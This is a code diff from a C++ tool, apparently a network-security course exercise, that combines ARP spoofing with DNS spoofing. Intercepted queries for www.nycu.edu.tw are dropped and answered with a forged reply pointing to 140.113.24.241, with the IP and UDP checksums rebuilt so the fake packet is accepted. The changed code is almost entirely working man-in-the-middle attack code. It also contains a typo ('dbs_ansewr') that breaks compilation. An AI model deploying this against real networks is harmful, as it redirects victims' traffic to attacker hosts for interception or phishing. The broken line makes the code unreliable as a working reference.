@@ -363,7 +363,7 @@ void keep_sending_arp_reply(unsigned char *source_mac_char, unsigned char *gatew
     }
 }
 
-void send_spoofed_dns_reply(char *packet, int len)
+void send_spoofed_dns_reply(char *packet)
 {
     // change the destination IP address to 140.113.24.241
     struct iphdr *ip_header = (struct iphdr *)packet;
@@ -414,17 +414,63 @@ void send_spoofed_dns_reply(char *packet, int len)
     answer->rdlength = htons(4);
     dns_answer += sizeof(answer_section);
     // attach the IP 140.113.24.241 address to the answer section
-    packet[41] = 140;
-    packet[42] = 113;
-    packet[43] = 24;
-    packet[44] = 241;
-    // cout to check the spoofed DNS reply
-    cout << "Spoofed DNS reply: " << endl;
-    for (int i = 0; i < len; ++i)
+    *dns_answer = 140;
+    *(dns_answer + 1) = 113;
+    *(dns_answer + 2) = 24;
+    *(dns_answer + 3) = 241;
+    dns_answer += 4;
+
+    // calculate total length  
+    int len = dbs_ansewr - packet;
+    cout << "len: " << len << endl;
+    ip_header->tot_len = htons(len);
+    // calculate udp checksum
+    udp_header->check = 0;
+    // pseudo header
+    struct pseudo_header
     {
-        cout << packet[i];
+        uint32_t source_address;
+        uint32_t dest_address;
+        uint8_t placeholder;
+        uint8_t protocol;
+        uint16_t udp_length;
+    } psh;
+    psh.source_address = ip_header->saddr;
+    psh.dest_address = ip_header->daddr;
+    psh.placeholder = 0;
+    psh.protocol = IPPROTO_UDP;
+    psh.udp_length = htons(ntohs(ip_header->tot_len) - ip_header->ihl * 4);
+    int psize = sizeof(struct pseudo_header) + ntohs(ip_header->tot_len) - ip_header->ihl * 4;
+    char *pseudogram = (char *)malloc(psize);
+    memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
+    memcpy(pseudogram + sizeof(struct pseudo_header), udp_header, ntohs(ip_header->tot_len) - ip_header->ihl * 4);
+    // calculate the checksum
+    unsigned short *udp_checksum = (unsigned short *)pseudogram;
+    unsigned long sum = 0;
+    for (int i = 0; i < psize / 2; i++)
+    {
+        sum += udp_checksum[i];
     }
-    cout << endl;
+    while (sum >> 16)
+    {
+        sum = (sum & 0xFFFF) + (sum >> 16);
+    }
+    udp_header->check = ~sum;
+
+
+    // calculate the ip checksum
+    ip_header->check = 0;
+    unsigned short *ip_checksum = (unsigned short *)ip_header;
+    sum = 0;
+    for (int i = 0; i < ip_header->ihl * 2; i++)
+    {
+        sum += ip_checksum[i];
+    }
+    while (sum >> 16)
+    {
+        sum = (sum & 0xFFFF) + (sum >> 16);
+    }
+    ip_header->check = ~sum;
 
 
 
@@ -473,7 +519,8 @@ static int dns_nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfms
                     cout << "DNS query to www.nycu.edu.tw" << endl;
                     // send the spoofed DNS reply
                     // change the destination IP address to
-                    send_spoofed_dns_reply(packet, ret);
+                    // send_spoofed_dns_reply(packet, ret);
+                    send_spoofed_dns_reply(packet);
                     return nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
                 }
 
